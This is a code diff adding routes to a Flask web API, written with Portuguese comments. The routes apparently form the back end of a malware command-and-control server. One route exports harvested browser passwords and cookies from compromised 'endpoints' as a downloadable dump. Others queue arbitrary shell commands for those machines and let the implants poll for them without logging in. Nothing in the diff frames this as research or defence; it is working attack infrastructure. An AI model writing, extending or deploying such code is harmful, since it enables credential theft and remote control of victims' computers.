@@ -145,3 +145,59 @@ def test_api():
 @require_login
 def get_system_logs():
     return jsonify(store.system_logs)
+
+@api_bp.route('/api/dump/<endpoint_id>', methods=['GET'])
+@require_login
+def dump_data(endpoint_id):
+    from flask import Response
+    import json
+    
+    if endpoint_id not in store.endpoints:
+        return jsonify({'error': 'Endpoint não encontrado'}), 404
+        
+    dump = f"================ EXTRACT DUMP : {endpoint_id} ================\n\n"
+    
+    # Adicionando Senhas
+    passwords = [p for p in store.endpoints.get(endpoint_id, {}).get('passwords', [])]
+    dump += "=== SENHAS NAVEGADOR ===\n"
+    for p in passwords:
+        dump += f"URL: {p.get('url', '')}\nUSER: {p.get('username', '')}\nPASS: {p.get('password', '')}\n--\n"
+        
+    # Adicionando Cookies
+    cookies = [c for c in store.endpoints.get(endpoint_id, {}).get('cookies', [])]
+    dump += "\n=== COOKIES ===\n"
+    for c in cookies:
+        dump += f"HOST: {c.get('host', '')}\nNAME: {c.get('name', '')}\nVALUE: {c.get('value', '')}\n--\n"
+        
+    store.add_log('WARNING', 'C2', f"Dump completo extraído para o endpoint {endpoint_id}")
+    return Response(dump, mimetype='text/plain', headers={"Content-Disposition": f"attachment;filename=dump_{endpoint_id}.txt"})
+
+@api_bp.route('/api/command_request/<endpoint_id>', methods=['POST'])
+@require_login
+def request_command(endpoint_id):
+    data = request.get_json()
+    command = data.get('command')
+    if not command:
+         return jsonify({'error': 'Comando vazio'}), 400
+         
+    if endpoint_id not in store.command_queues:
+        store.command_queues[endpoint_id] = []
+        
+    cmd_data = {
+        'id': f"cmd_{datetime.now().timestamp()}",
+        'command': command,
+        'status': 'pending',
+        'timestamp': datetime.now().isoformat()
+    }
+    store.command_queues[endpoint_id].append(cmd_data)
+    store.add_log('WARNING', 'C2', f"Comando '{command}' enviado para fila do endpoint {endpoint_id}")
+    
+    return jsonify({'success': True, 'command_id': cmd_data['id']})
+
+@api_bp.route('/api/check_commands/<endpoint_id>', methods=['GET'])
+def check_commands(endpoint_id):
+    if endpoint_id in store.command_queues and len(store.command_queues[endpoint_id]) > 0:
+        # Pega e remove o comando mais antigo da fila
+        cmd = store.command_queues[endpoint_id].pop(0)
+        return jsonify({'has_command': True, 'command': cmd['command'], 'command_id': cmd['id']})
+    return jsonify({'has_command': False})
